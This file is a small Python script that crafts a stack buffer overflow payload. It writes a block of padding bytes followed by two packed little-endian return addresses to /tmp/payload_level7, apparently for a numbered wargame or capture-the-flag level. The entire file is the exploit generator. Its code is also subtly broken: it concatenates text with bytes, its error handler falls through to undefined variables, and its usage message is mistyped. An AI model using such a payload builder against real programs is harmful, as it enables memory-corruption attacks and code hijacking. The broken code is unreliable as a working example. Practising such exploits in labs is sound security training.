import struct
import sys


exploit_file = "/tmp/payload_level7"

def craft_payload(target_address, target_address2, buffer_size):
	payload = b'A' * buffer_size
	payload += struct.pack('<I', target_address)
	payload += " "
	payload += struct.pack('<I', target_address2)
	with open(exploit_file, "wb") as file1:
		file1.write(payload)


def main():
	if len(sys.argv) != 4:
		print("Use:\n<target address 1> <target address 1> <offset>\n")
		return
	try:
		address = int(sys.argv[1].replace('0x', ''), 16)
		address2 = int(sys.argv[2].replace('0x', ''), 16)
		offset = int(sys.argv[3])
	except:
		print("not an a valid address")
	print("crafting payload...")
	craft_payload(address, address2, offset)
	print("done:\n{}".format(exploit_file))


if __name__ == "__main__":
	main()
